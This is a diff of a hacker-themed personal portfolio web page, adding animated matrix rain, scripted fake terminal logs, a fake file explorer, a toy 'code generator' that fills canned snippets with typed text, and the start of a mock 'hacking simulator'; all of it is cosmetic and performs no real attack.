+    <!-- ============================================== -->
+    <!-- TERMINAL LOGS SECTION -->
+    <!-- ============================================== -->
+    <div class="terminal-card">
+        <div class="terminal-header">
+            <span class="terminal-dot dot-red"></span>
+            <span class="terminal-dot dot-yellow"></span>
+            <span class="terminal-dot dot-green"></span>
+            <span class="terminal-title">TERMINAL — LOGS</span>
         </div>
-        <div class="skill">
-            <p>APK Modding <span class="skill-percent">96%</span></p>
-            <div class="bar"><div class="fill" data-width="96"></div></div>
-        </div>
-        <div class="skill">
-            <p>Python & Automation <span class="skill-percent">95%</span></p>
-            <div class="bar"><div class="fill" data-width="95"></div></div>
-        </div>
-        <div class="skill">
-            <p>Telegram Bots <span class="skill-percent">97%</span></p>
-            <div class="bar"><div class="fill" data-width="97"></div></div>
-        </div>
-        <div class="skill">
-            <p>Web Development <span class="skill-percent">92%</span></p>
-            <div class="bar"><div class="fill" data-width="92"></div></div>
-        </div>
-        <div class="skill">
-            <p>Firebase & Cloud <span class="skill-percent">90%</span></p>
-            <div class="bar"><div class="fill" data-width="90"></div></div>
-        </div>
-        <div class="skill">
-            <p>Cyber Security <span class="skill-percent">93%</span></p>
-            <div class="bar"><div class="fill" data-width="93"></div></div>
-        </div>
-        <div class="skill">
-            <p>UI/UX Design <span class="skill-percent">87%</span></p>
-            <div class="bar"><div class="fill" data-width="87"></div></div>
-        </div>
-        <div class="skill">
-            <p>Game Modding <span class="skill-percent">94%</span></p>
-            <div class="bar"><div class="fill" data-width="94"></div></div>
-        </div>
-        <div class="skill">
-            <p>Malware Analysis <span class="skill-percent">91%</span></p>
-            <div class="bar"><div class="fill" data-width="91"></div></div>
+        <div class="terminal-body">
+            <div class="terminal-logs" id="terminal"></div>
         </div>
     </div>
-</div>
 
-<div class="terminal-card">
-    <div class="terminal-header">
-        <span class="terminal-dot dot-red"></span>
-        <span class="terminal-dot dot-yellow"></span>
-        <span class="terminal-dot dot-green"></span>
-        <span class="terminal-title">TERMINAL — LOGS</span>
-    </div>
-    <div class="terminal-body">
-        <div class="terminal-logs" id="terminal"></div>
-    </div>
-</div>
-
-<div class="terminal-card">
-    <div class="terminal-header">
-        <span class="terminal-dot dot-red"></span>
-        <span class="terminal-dot dot-yellow"></span>
-        <span class="terminal-dot dot-green"></span>
-        <span class="terminal-title">FILE EXPLORER — SYSTEM</span>
-    </div>
-    <div class="terminal-body">
-        <div class="file-explorer" id="folderExplorer">
-            <div class="explorer-line" id="explorerRoot">📂 <span class="folder">C:\Users\REVERSE\</span></div>
-            <div class="explorer-line file-hide" id="explorerLine1">📁 <span class="folder">Documents</span></div>
-            <div class="explorer-line file-hide" id="explorerLine2">📁 <span class="folder">Projects</span></div>
-            <div class="explorer-line file-hide" id="explorerLine3">📁 <span class="folder">Cheats</span></div>
-            <div class="explorer-line file-hide" id="explorerLine4">📁 <span class="folder">Tools</span></div>
-            <div class="explorer-line file-hide" id="explorerLine5">📄 <span class="file">reverse_engine.py</span></div>
-            <div class="explorer-line file-hide" id="explorerLine6">📄 <span class="file">apk_modder.exe</span></div>
-            <div class="explorer-line file-hide" id="explorerLine7">📄 <span class="file">payload.bin</span></div>
-            <div class="explorer-line file-hide" id="explorerLine8">📄 <span class="file">config.json</span></div>
-            <div class="explorer-line file-hide" id="explorerLine9">📄 <span class="file">encrypted_key.txt</span></div>
-            <div class="explorer-line file-hide" id="explorerLine10">📄 <span class="file">logs.log</span></div>
-            <div class="explorer-line" id="explorerCursor"></div>
+    <!-- ============================================== -->
+    <!-- FILE EXPLORER SECTION -->
+    <!-- ============================================== -->
+    <div class="terminal-card">
+        <div class="terminal-header">
+            <span class="terminal-dot dot-red"></span>
+            <span class="terminal-dot dot-yellow"></span>
+            <span class="terminal-dot dot-green"></span>
+            <span class="terminal-title">FILE EXPLORER — SYSTEM</span>
+        </div>
+        <div class="terminal-body">
+            <div class="file-explorer" id="folderExplorer">
+                <div class="explorer-line" id="explorerRoot">📂 <span class="folder">C:\Users\REVERSE\</span></div>
+                <div class="explorer-line file-hide" id="explorerLine1">📁 <span class="folder">Documents</span></div>
+                <div class="explorer-line file-hide" id="explorerLine2">📁 <span class="folder">Projects</span></div>
+                <div class="explorer-line file-hide" id="explorerLine3">📁 <span class="folder">Cheats</span></div>
+                <div class="explorer-line file-hide" id="explorerLine4">📁 <span class="folder">Tools</span></div>
+                <div class="explorer-line file-hide" id="explorerLine5">📄 <span class="file">reverse_engine.py</span></div>
+                <div class="explorer-line file-hide" id="explorerLine6">📄 <span class="file">apk_modder.exe</span></div>
+                <div class="explorer-line file-hide" id="explorerLine7">📄 <span class="file">payload.bin</span></div>
+                <div class="explorer-line file-hide" id="explorerLine8">📄 <span class="file">config.json</span></div>
+                <div class="explorer-line file-hide" id="explorerLine9">📄 <span class="file">encrypted_key.txt</span></div>
+                <div class="explorer-line file-hide" id="explorerLine10">📄 <span class="file">logs.log</span></div>
+                <div class="explorer-line" id="explorerCursor"></div>
+            </div>
         </div>
     </div>
-</div>
+    <!-- ============================================== -->
+    <!-- CODE CONVERTER SECTION -->
+    <!-- ============================================== -->
+    <div class="terminal-card" id="codeConverterSection">
+        <div class="terminal-header">
+            <span class="terminal-dot dot-red"></span>
+            <span class="terminal-dot dot-yellow"></span>
+            <span class="terminal-dot dot-green"></span>
+            <span class="terminal-title">🔓 HACKER TYPE — REAL CODE GENERATOR</span>
+        </div>
+        <div class="terminal-body">
+            <div style="display:flex; flex-direction:column; gap:15px;">
+                <div class="converter-controls">
+                    <span style="color:#66ff99; font-size:0.8rem;">🎯 TARGET LANGUAGE</span>
+                    <select id="targetLanguage">
+                        <option value="python">Python</option>
+                        <option value="cpp">C++</option>
+                        <option value="c">C</option>
+                        <option value="java">Java</option>
+                    </select>
+                    <span class="live-badge">⚡ LIVE</span>
+                    <span style="color:#ffaa00; font-size:0.7rem; margin-left:10px;">[ Random Real Code ]</span>
+                </div>
+                <div class="converter-layout">
+                    <div class="converter-box">
+                        <div class="box-label">▼ TYPE ANYTHING (HACKER MODE)</div>
+                        <textarea id="inputCode" placeholder="Type anything... e.g., 'abcde' or 'hello world'..."></textarea>
+                    </div>
+                    <div class="converter-box">
+                        <div class="box-label">▼ REAL CODE GENERATED</div>
+                        <pre id="outputCode">// Select language and start typing...</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-<footer>
-    ⚡ REVERSE X OFFICIAL ⚡ — SYSTEM READY
-</footer>
+    <!-- ============================================== -->
+    <!-- HACKING SIMULATOR SECTION -->
+    <!-- ============================================== -->
+    <div class="terminal-card" id="hackingSimulator">
+        <div class="terminal-header">
+            <span class="terminal-dot dot-red"></span>
+            <span class="terminal-dot dot-yellow"></span>
+            <span class="terminal-dot dot-green"></span>
+            <span class="terminal-title">🕵️ HACKING SIMULATOR — TERMUX</span>
+        </div>
+        <div class="terminal-body">
+            <div style="display:flex; flex-direction:column; gap:15px;">
+                <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
+                    <span style="color:#66ff99; font-size:0.8rem;">🎯 TARGET</span>
+                    <select id="hackTarget" style="padding:10px 20px; background:#0a0a0a; border:1px solid #00ff41; color:#00ff41; font-family:'Courier New',monospace; font-size:0.9rem; border-radius:4px; cursor:pointer;">
+                        <option value="cia">CIA Server</option>
+                        <option value="darkweb">Dark Web</option>
+                        <option value="bank">Bank System</option>
+                        <option value="government">Government</option>
+                        <option value="alien">Alien Mainframe</option>
+                    </select>
+                    <button id="startHackBtn" class="btn" style="padding:10px 30px;">🚀 START HACK</button>
+                    <button id="clearHackBtn" class="btn" style="padding:10px 30px;">🗑️ CLEAR</button>
+                    <span class="live-badge">⚡ TERMUX</span>
+                </div>
+                <div style="margin-top:10px;">
+                    <pre id="hackOutput" style="background:#0a0a0a; border:1px solid #00ff41; border-radius:4px; padding:15px; color:#66ff99; font-family:'Courier New',monospace; font-size:0.85rem; min-height:400px; max-height:500px; overflow-y:auto; white-space:pre-wrap; word-wrap:break-word; margin:0; line-height:1.6;">$ Welcome to Termux Hacking Simulator
+$ Select a target and click START HACK
+$ Commands will run automatically...</pre>
+                </div>
+            </div>
+        </div>
+    </div>
 
-<script>
-    // ==============================================
-    // MATRIX RAIN - HACKER WORDS
-    // ==============================================
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
+    <!-- ============================================== -->
+    <!-- CREDITS SECTION -->
+    <!-- ============================================== -->
+    <div class="terminal-card">
+        <div class="terminal-header">
+            <span class="terminal-dot dot-red"></span>
+            <span class="terminal-dot dot-yellow"></span>
+            <span class="terminal-dot dot-green"></span>
+            <span class="terminal-title">🔥 CREDITS</span>
+        </div>
+        <div class="terminal-body" style="text-align: center; padding: 20px;">
+            <div style="color: #00ff41; font-size: 1.5rem; font-weight: bold; letter-spacing: 4px;">
+                ⚡ MADE BY DAKSH ⚡
+            </div>
+            <div style="color: #66ff99; font-size: 0.9rem; margin-top: 5px; opacity: 0.8;">
+                REVERSE X OFFICIAL
+            </div>
+            <div style="color: #66ff99; font-size: 0.8rem; margin-top: 10px; opacity: 0.7;">
+                REVERSE ENGINEERING • CYBER SECURITY • HACKER TYPE
+            </div>
+            <div style="margin-top: 15px;">
+                <span style="color: #ffaa00; font-size: 0.7rem;">🔒 ENCRYPTED</span>
+                <span style="color: #66ff99; font-size: 0.7rem; margin-left: 20px;">🛡️ SECURE</span>
+                <span style="color: #00ff41; font-size: 0.7rem; margin-left: 20px;">⚡ ROOT</span>
+            </div>
+        </div>
+    </div>
 
-    canvas.height = window.innerHeight;
-    canvas.width = window.innerWidth;
+    <footer>
+        ⚡ REVERSE X OFFICIAL ⚡ — SYSTEM READY
+    </footer>
 
-    const hackerWords = [
-        'HACK', 'ROOT', 'ACCESS', 'GRANTED', 'DENIED', 'ERROR',
-        'SYSTEM', 'NETWORK', 'FIREWALL', 'BYFASS', 'EXPLOIT',
-        'INJECT', 'PAYLOAD', 'SHELL', 'CRACK', 'DECRYPT',
-        'ENCRYPT', 'KEY', 'TOKEN', 'SESSION', 'ADMIN',
-        'SUDO', 'KERNEL', 'MODULE', 'DRIVER',
-        'PROCESS', 'THREAD', 'MEMORY', 'STACK', 'HEAP',
-        'BUFFER', 'OVERFLOW', 'SCAN', 'PORT', 'PING',
-        'PROXY', 'VPN', 'TOR', 'DARK', 'WEB', 'SQL',
-        'XSS', 'CSRF', 'RCE', 'LFI', 'RFI',
-        'MALWARE', 'VIRUS', 'TROJAN', 'RAT', 'SPY',
-        'REVERSE', 'ENGINEER', 'DEBUG', 'TRACE', 'LOG',
-        'BREACH', 'SECURE', 'ENCRYPTED', 'DECODED', 'SHELLCODE',
-        'BACKDOOR', 'BOTNET', 'CRYPTO', 'DARKWEB', 'EXFIL',
-        'HONEYPOT', 'KEYLOGGER', 'PHISHING', 'SPOOF', 'ZOMBIE'
-    ];
+    <script>
+        // ==============================================
+        // MATRIX RAIN - HACKER WORDS
+        // ==============================================
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
 
-    const fontSize = 18;
-    const columns = Math.floor(canvas.width / fontSize);
-    const drops = [];
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
 
-    for (let x = 0; x < columns; x++) {
-        drops[x] = {
-            y: Math.random() * -100,
-            speed: 0.8 + Math.random() * 1.5,
-            word: hackerWords[Math.floor(Math.random() * hackerWords.length)],
-            charIndex: 0
-        };
-    }
+        const hackerWords = [
+            'HACK', 'ROOT', 'ACCESS', 'GRANTED', 'DENIED', 'ERROR',
+            'SYSTEM', 'NETWORK', 'FIREWALL', 'BYFASS', 'EXPLOIT',
+            'INJECT', 'PAYLOAD', 'SHELL', 'CRACK', 'DECRYPT',
+            'ENCRYPT', 'KEY', 'TOKEN', 'SESSION', 'ADMIN',
+            'SUDO', 'KERNEL', 'MODULE', 'DRIVER',
+            'PROCESS', 'THREAD', 'MEMORY', 'STACK', 'HEAP',
+            'BUFFER', 'OVERFLOW', 'SCAN', 'PORT', 'PING',
+            'PROXY', 'VPN', 'TOR', 'DARK', 'WEB', 'SQL',
+            'XSS', 'CSRF', 'RCE', 'LFI', 'RFI',
+            'MALWARE', 'VIRUS', 'TROJAN', 'RAT', 'SPY',
+            'REVERSE', 'ENGINEER', 'DEBUG', 'TRACE', 'LOG',
+            'BREACH', 'SECURE', 'ENCRYPTED', 'DECODED', 'SHELLCODE',
+            'BACKDOOR', 'BOTNET', 'CRYPTO', 'DARKWEB', 'EXFIL',
+            'HONEYPOT', 'KEYLOGGER', 'PHISHING', 'SPOOF', 'ZOMBIE'
+        ];
 
-    function drawMatrix() {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        const fontSize = 18;
+        const columns = Math.floor(canvas.width / fontSize);
+        const drops = [];
 
-        for (let i = 0; i < drops.length; i++) {
-            ctx.shadowBlur = 20;
-            ctx.shadowColor = '#00ff41';
-            ctx.fillStyle = '#00ff41';
-            ctx.font = fontSize + 'px monospace';
+        for (let x = 0; x < columns; x++) {
+            drops[x] = {
+                y: Math.random() * -100,
+                speed: 0.8 + Math.random() * 1.5,
+                word: hackerWords[Math.floor(Math.random() * hackerWords.length)],
+                charIndex: 0
+            };
+        }
 
-            const word = drops[i].word;
-            const char = word[drops[i].charIndex % word.length];
-            ctx.fillText(char, i * fontSize, drops[i].y * fontSize);
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-            drops[i].y += drops[i].speed;
-            drops[i].charIndex++;
+            for (let i = 0; i < drops.length; i++) {
+                ctx.shadowBlur = 20;
+                ctx.shadowColor = '#00ff41';
+                ctx.fillStyle = '#00ff41';
+                ctx.font = fontSize + 'px monospace';
 
-            if (drops[i].y * fontSize > canvas.height + 50) {
-                drops[i].y = -10;
-                drops[i].speed = 0.8 + Math.random() * 1.5;
-                drops[i].word = hackerWords[Math.floor(Math.random() * hackerWords.length)];
-                drops[i].charIndex = 0;
+                const word = drops[i].word;
+                const char = word[drops[i].charIndex % word.length];
+                ctx.fillText(char, i * fontSize, drops[i].y * fontSize);
+
+                drops[i].y += drops[i].speed;
+                drops[i].charIndex++;
+
+                if (drops[i].y * fontSize > canvas.height + 50) {
+                    drops[i].y = -10;
+                    drops[i].speed = 0.8 + Math.random() * 1.5;
+                    drops[i].word = hackerWords[Math.floor(Math.random() * hackerWords.length)];
+                    drops[i].charIndex = 0;
+                }
             }
         }
-    }
 
-    setInterval(drawMatrix, 30);
+        setInterval(drawMatrix, 30);
 
-    // ==============================================
-    // CLOCK
-    // ==============================================
-    function updateClock() {
-        const now = new Date();
-        const time = now.toTimeString().split(' ')[0];
-        document.getElementById('clockDisplay').innerHTML = '⏰ ' + time;
-    }
-    setInterval(updateClock, 1000);
-    updateClock();
-
-    // ==============================================
-    // CURSOR FOLLOW
-    // ==============================================
-    const cursor = document.getElementById('cursor');
-    const cursorDot = document.getElementById('cursorDot');
-
-    document.addEventListener('mousemove', (e) => {
-        cursor.style.left = e.clientX + 'px';
-        cursor.style.top = e.clientY + 'px';
-        cursorDot.style.left = e.clientX + 'px';
-        cursorDot.style.top = e.clientY + 'px';
-    });
-
-    document.addEventListener('mousedown', () => {
-        cursor.style.width = '14px';
-        cursor.style.height = '14px';
-    });
-
-    document.addEventListener('mouseup', () => {
-        cursor.style.width = '20px';
-        cursor.style.height = '20px';
-    });
-
-    // ==============================================
-    // TYPING EFFECT
-    // ==============================================
-    const typingText = document.getElementById('typingText');
-    const textToType = 'Accessing encrypted profile... Identity Verified ✓';
-    let charIndex = 0;
-
-    function typeCharacter() {
-        typingText.textContent = textToType.substring(0, charIndex + 1);
-        charIndex++;
-
-        if (charIndex < textToType.length) {
-            setTimeout(typeCharacter, 20 + Math.random() * 50);
-        } else {
-            setTimeout(() => {
-                startTerminal();
-            }, 500);
+        // ==============================================
+        // CLOCK
+        // ==============================================
+        function updateClock() {
+            const now = new Date();
+            const time = now.toTimeString().split(' ')[0];
+            document.getElementById('clockDisplay').innerHTML = '⏰ ' + time;
         }
-    }
+        setInterval(updateClock, 1000);
+        updateClock();
 
-    // ==============================================
-    // TERMINAL LOGS
-    // ==============================================
-    const terminalLines = [
-        { text: 'Initializing System...', type: 'command' },
-        { text: 'Checking Security Layer...', type: 'command' },
-        { text: 'Access Granted ✓', type: 'success' },
-        { text: 'Loading Portfolio...', type: 'command' },
-        { text: 'Loading Skills...', type: 'command' },
-        { text: 'Connected Successfully ✓', type: 'success' },
-        { text: 'Decrypting Data...', type: 'command' },
-        { text: 'Analyzing Network Traffic...', type: 'command' },
-        { text: 'Bypassing Firewall...', type: 'command' },
-        { text: 'Accessing Secure Server...', type: 'command' },
-        { text: 'Loading Encrypted Modules...', type: 'command' },
-        { text: 'System Ready ✓', type: 'success' }
-    ];
+        // ==============================================
+        // CURSOR FOLLOW
+        // ==============================================
+        const cursor = document.getElementById('cursor');
+        const cursorDot = document.getElementById('cursorDot');
 
-    let currentLine = 0;
-    let currentCharTerm = 0;
-    let isTerminalTyping = false;
-    const terminalElement = document.getElementById('terminal');
+        document.addEventListener('mousemove', (e) => {
+            cursor.style.left = e.clientX + 'px';
+            cursor.style.top = e.clientY + 'px';
+            cursorDot.style.left = e.clientX + 'px';
+            cursorDot.style.top = e.clientY + 'px';
+        });
 
-    function typeTerminalCharacter() {
-        if (currentLine >= terminalLines.length) {
-            setTimeout(() => {
-                startExplorer();
-            }, 500);
-            return;
+        document.addEventListener('mousedown', () => {
+            cursor.style.width = '14px';
+            cursor.style.height = '14px';
+        });
+
+        document.addEventListener('mouseup', () => {
+            cursor.style.width = '20px';
+            cursor.style.height = '20px';
+        });
+
+        // ==============================================
+        // TYPING EFFECT
+        // ==============================================
+        const typingText = document.getElementById('typingText');
+        const textToType = 'Accessing encrypted profile... Identity Verified ✓';
+        let charIndex = 0;
+
+        function typeCharacter() {
+            typingText.textContent = textToType.substring(0, charIndex + 1);
+            charIndex++;
+
+            if (charIndex < textToType.length) {
+                setTimeout(typeCharacter, 20 + Math.random() * 50);
+            } else {
+                setTimeout(() => {
+                    startTerminal();
+                }, 500);
+            }
         }
 
-        const line = terminalLines[currentLine];
-        const char = line.text[currentCharTerm];
+        // ==============================================
+        // TERMINAL LOGS
+        // ==============================================
+        const terminalLines = [
+            { text: 'Initializing System...', type: 'command' },
+            { text: 'Checking Security Layer...', type: 'command' },
+            { text: 'Access Granted ✓', type: 'success' },
+            { text: 'Loading Portfolio...', type: 'command' },
+            { text: 'Loading Skills...', type: 'command' },
+            { text: 'Connected Successfully ✓', type: 'success' },
+            { text: 'Decrypting Data...', type: 'command' },
+            { text: 'Analyzing Network Traffic...', type: 'command' },
+            { text: 'Bypassing Firewall...', type: 'command' },
+            { text: 'Accessing Secure Server...', type: 'command' },
+            { text: 'Loading Encrypted Modules...', type: 'command' },
+            { text: 'System Ready ✓', type: 'success' }
+        ];
 
-        if (!isTerminalTyping) {
-            isTerminalTyping = true;
-            const newLine = document.createElement('div');
-            newLine.className = 'terminal-line';
-            newLine.innerHTML = '<span class="prompt">$</span> <span class="' + line.type + '"></span>';
-            terminalElement.appendChild(newLine);
+        let currentLine = 0;
+        let currentCharTerm = 0;
+        let isTerminalTyping = false;
+        const terminalElement = document.getElementById('terminal');
+
+        function typeTerminalCharacter() {
+            if (currentLine >= terminalLines.length) {
+                setTimeout(() => {
+                    startExplorer();
+                }, 500);
+                return;
+            }
+
+            const line = terminalLines[currentLine];
+            const char = line.text[currentCharTerm];
+
+            if (!isTerminalTyping) {
+                isTerminalTyping = true;
+                const newLine = document.createElement('div');
+                newLine.className = 'terminal-line';
+                newLine.innerHTML = '<span class="prompt">$</span> <span class="' + line.type + '"></span>';
+                terminalElement.appendChild(newLine);
+            }
+
+            const lineElement = terminalElement.lastElementChild;
+            const span = lineElement.querySelector('span.' + line.type);
+
+            if (currentCharTerm < line.text.length) {
+                span.textContent += line.text[currentCharTerm];
+                currentCharTerm++;
+                setTimeout(typeTerminalCharacter, 15 + Math.random() * 30);
+            } else {
+                currentCharTerm = 0;
+                currentLine++;
+                isTerminalTyping = false;
+                setTimeout(typeTerminalCharacter, 200 + Math.random() * 300);
+            }
         }
 
-        const lineElement = terminalElement.lastElementChild;
-        const span = lineElement.querySelector('span.' + line.type);
-
-        if (currentCharTerm < line.text.length) {
-            span.textContent += line.text[currentCharTerm];
-            currentCharTerm++;
-            setTimeout(typeTerminalCharacter, 15 + Math.random() * 30);
-        } else {
+        function startTerminal() {
+            terminalElement.innerHTML = '';
+            currentLine = 0;
             currentCharTerm = 0;
-            currentLine++;
             isTerminalTyping = false;
-            setTimeout(typeTerminalCharacter, 200 + Math.random() * 300);
-        }
-    }
-
-    function startTerminal() {
-        terminalElement.innerHTML = '';
-        currentLine = 0;
-        currentCharTerm = 0;
-        isTerminalTyping = false;
-        setTimeout(typeTerminalCharacter, 300);
-    }
-
-    // ==============================================
-    // FILE EXPLORER
-    // ==============================================
-    const explorerLines = [
-        '📂 C:\\Users\\REVERSE\\',
-        '📁 Documents',
-        '📁 Projects',
-        '📁 Cheats',
-        '📁 Tools',
-        '📄 reverse_engine.py',
-        '📄 apk_modder.exe',
-        '📄 payload.bin',
-        '📄 config.json',
-        '📄 encrypted_key.txt',
-        '📄 logs.log'
-    ];
-
-    let explorerIndex = 0;
-
-    function typeExplorerLine() {
-        if (explorerIndex >= explorerLines.length) {
-            document.getElementById('explorerCursor').innerHTML = '<span class="explorer-cursor"></span>';
-            return;
+            setTimeout(typeTerminalCharacter, 300);
         }
 
-        const lineId = explorerIndex === 0 ? 'explorerRoot' : 'explorerLine' + explorerIndex;
-        const lineElement = document.getElementById(lineId);
+        // ==============================================
+        // FILE EXPLORER
+        // ==============================================
+        const explorerLines = [
+            '📂 C:\\Users\\REVERSE\\',
+            '📁 Documents',
+            '📁 Projects',
+            '📁 Cheats',
+            '📁 Tools',
+            '📄 reverse_engine.py',
+            '📄 apk_modder.exe',
+            '📄 payload.bin',
+            '📄 config.json',
+            '📄 encrypted_key.txt',
+            '📄 logs.log'
+        ];
 
-        if (lineElement) {
-            lineElement.classList.remove('file-hide');
-            lineElement.style.opacity = '0';
-            setTimeout(() => {
-                lineElement.style.opacity = '1';
-            }, 50);
-        }
+        let explorerIndex = 0;
 
-        explorerIndex++;
-        setTimeout(typeExplorerLine, 300 + Math.random() * 400);
-    }
-
-    function startExplorer() {
-        const explorerElements = document.querySelectorAll('.explorer-line');
-        explorerElements.forEach(el => {
-            if (el.id !== 'explorerRoot' && el.id !== 'explorerCursor') {
-                el.classList.add('file-hide');
-                el.style.opacity = '0';
+        function typeExplorerLine() {
+            if (explorerIndex >= explorerLines.length) {
+                document.getElementById('explorerCursor').innerHTML = '<span class="explorer-cursor"></span>';
+                return;
             }
-        });
-        explorerIndex = 1;
-        setTimeout(typeExplorerLine, 500);
-    }
 
-    // ==============================================
-    // SKILL BAR ANIMATION
-    // ==============================================
-    function animateSkillBars() {
-        const fills = document.querySelectorAll('.fill');
-        fills.forEach((fill, index) => {
-            const targetWidth = parseInt(fill.getAttribute('data-width'));
-            fill.style.width = '0%';
-            setTimeout(() => {
-                fill.style.width = targetWidth + '%';
-            }, 200 + index * 80);
-        });
-    }
+            const lineId = explorerIndex === 0 ? 'explorerRoot' : 'explorerLine' + explorerIndex;
+            const lineElement = document.getElementById(lineId);
 
-    // ==============================================
-    // INTERSECTION OBSERVER
-    // ==============================================
-    const skillsSection = document.getElementById('skillsSection');
-    let skillsAnimated = false;
-
-    const observer = new IntersectionObserver((entries) => {
-        entries.forEach(entry => {
-            if (entry.isIntersecting && !skillsAnimated) {
-                skillsAnimated = true;
-                animateSkillBars();
+            if (lineElement) {
+                lineElement.classList.remove('file-hide');
+                lineElement.style.opacity = '0';
+                setTimeout(() => {
+                    lineElement.style.opacity = '1';
+                }, 50);
             }
-        });
-    }, { threshold: 0.3 });
 
-    observer.observe(skillsSection);
+            explorerIndex++;
+            setTimeout(typeExplorerLine, 300 + Math.random() * 400);
+        }
 
-    // ==============================================
-    // START EVERYTHING
-    // ==============================================
-    setTimeout(typeCharacter, 300);
-</script>
+        function startExplorer() {
+            const explorerElements = document.querySelectorAll('.explorer-line');
+            explorerElements.forEach(el => {
+                if (el.id !== 'explorerRoot' && el.id !== 'explorerCursor') {
+                    el.classList.add('file-hide');
+                    el.style.opacity = '0';
+                }
+            });
+            explorerIndex = 1;
+            setTimeout(typeExplorerLine, 500);
+        }
+
+        // ==============================================
+        // SKILL BAR ANIMATION
+        // ==============================================
+        function animateSkillBars() {
+            const fills = document.querySelectorAll('.fill');
+            fills.forEach((fill, index) => {
+                const targetWidth = parseInt(fill.getAttribute('data-width'));
+                fill.style.width = '0%';
+                setTimeout(() => {
+                    fill.style.width = targetWidth + '%';
+                }, 200 + index * 80);
+            });
+        }
+
+        // ==============================================
+        // INTERSECTION OBSERVER
+        // ==============================================
+        const skillsSection = document.getElementById('skillsSection');
+        let skillsAnimated = false;
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting && !skillsAnimated) {
+                    skillsAnimated = true;
+                    animateSkillBars();
+                }
+            });
+        }, { threshold: 0.3 });
+
+        observer.observe(skillsSection);
+
+        // ==============================================
+        // HACKER TYPE — REAL CODE GENERATOR
+        // ==============================================
+        const inputField = document.getElementById('inputCode');
+        const langSelect = document.getElementById('targetLanguage');
+        const outputField = document.getElementById('outputCode');
+
+        const codeTemplates = {
+            python: [
+                `import os
+        import sys
+
+        def main():
+            data = "USER_INPUT"
+            print(f"Processing: {data}")
+            result = data.upper()
+            return result
+
+        if __name__ == "__main__":
+            main()`,
+
+                `class HackerTool:
+            def __init__(self, target):
+                self.target = target
+                self.status = "active"
+
+            def exploit(self):
+                return f"Exploiting {self.target}"
+
+            def cleanup(self):
+                self.status = "inactive"
+
+        tool = HackerTool("USER_INPUT")
+        print(tool.exploit())`,
+
+                `import requests
+        import json
+
+        def fetch_data(url):
+            try:
+                response = requests.get(url)
+                return response.json()
+            except Exception as e:
+                return {"error": str(e)}
+
+        data = fetch_data("USER_INPUT")
+        print(json.dumps(data, indent=2))`
+            ],
+
+            cpp: [
+                `#include <iostream>
+        #include <string>
+        using namespace std;
+
+        int main() {
+            string input = "USER_INPUT";
+            cout << "Processing: " << input << endl;
+            cout << "Length: " << input.length() << endl;
+            return 0;
+        }`,
+
+                `#include <iostream>
+        #include <vector>
+        using namespace std;
+
+        class Exploit {
+        public:
+            string target;
+            Exploit(string t) : target(t) {}
+            void run() {
+                cout << "Running exploit on " << target << endl;
+            }
+        };
+
+        int main() {
+            Exploit e("USER_INPUT");
+            e.run();
+            return 0;
+        }`,
+
+                `#include <iostream>
+        #include <fstream>
+        using namespace std;
+
+        int main() {
+            string filename = "USER_INPUT";
+            ifstream file(filename);
+            if (file.is_open()) {
+                cout << "File opened successfully" << endl;
+                file.close();
+            }
+            return 0;
+        }`
+            ],
+
+            c: [
+                `#include <stdio.h>
+        #include <string.h>
+
+        int main() {
+            char input[] = "USER_INPUT";
+            printf("Processing: %s\n", input);
+            printf("Length: %zu\n", strlen(input));
+            return 0;
+        }`,
+
+                `#include <stdio.h>
+        #include <stdlib.h>
+
+        void exploit(char *target) {
+            printf("Exploiting: %s\n", target);
+        }
+
+        int main() {
+            char target[] = "USER_INPUT";
+            exploit(target);
+            return 0;
+        }`,
+
+                `#include <stdio.h>
+        #include <unistd.h>
+
+        int main() {
+            char *cmd = "USER_INPUT";
+            printf("Executing: %s\n", cmd);
+            system(cmd);
+            return 0;
+        }`
+            ],
+
+            java: [
+                `public class Main {
+            public static void main(String[] args) {
+                String input = "USER_INPUT";
+                System.out.println("Processing: " + input);
+                System.out.println("Length: " + input.length());
+            }
+        }`,
+
+                `public class Exploit {
+            private String target;
+
+            public Exploit(String target) {
+                this.target = target;
+            }
+
+            public void run() {
+                System.out.println("Exploiting: " + target);
+            }
+
+            public static void main(String[] args) {
+                Exploit e = new Exploit("USER_INPUT");
+                e.run();
+            }
+        }`,
+
+                `import java.io.*;
+        import java.net.*;
+
+        public class Main {
+            public static void main(String[] args) throws Exception {
+                String url = "USER_INPUT";
+                URL website = new URL(url);
+                BufferedReader in = new BufferedReader(
+                    new InputStreamReader(website.openStream()));
+                String line;
+                while ((line = in.readLine()) != null) {
+                    System.out.println(line);
+                }
+                in.close();
+            }
+        }`
+            ]
+        };
+
+        function getRandomTemplate(lang) {
+            const templates = codeTemplates[lang];
+            if (!templates) return "// Language not supported";
+            return templates[Math.floor(Math.random() * templates.length)];
+        }
+
+        function convertCode(input, lang) {
+            if (!input.trim()) {
+                return `// Select ${lang.toUpperCase()} and start typing...`;
+            }
+            let code = getRandomTemplate(lang);
+            code = code.replace(/USER_INPUT/g, input.trim());
+            return code;
+        }
+
+        function updateOutput() {
+            const input = inputField.value;
+            const lang = langSelect.value;
+
+            if (!input.trim()) {
+                outputField.textContent = `// Select language and start typing...`;
+                return;
+            }
+
+            const converted = convertCode(input, lang);
+            outputField.textContent = converted;
+        }
+
+        inputField.addEventListener('input', updateOutput);
+        langSelect.addEventListener('change', updateOutput);
+
+        // ==============================================
+        // MUSIC CONTROL
+        // ==============================================
+        const musicControl = document.getElementById('musicControl');
+        if (musicControl) {
+            musicControl.addEventListener('click', function() {
+                const audio = document.getElementById('bgMusic');
+                if (audio.paused) {
+                    audio.play().catch(() => {});
+                    this.innerHTML = '<span>🎵</span><span>MUSIC</span>';
+                } else {
+                    audio.pause();
+                    this.innerHTML = '<span>🔇</span><span>MUSIC</span>';
+                }
+            });
+        }
+
+            // ==============================================
+        // HACKING SIMULATOR - TERMUX STYLE
+        // ==============================================
+        const hackOutput = document.getElementById('hackOutput');
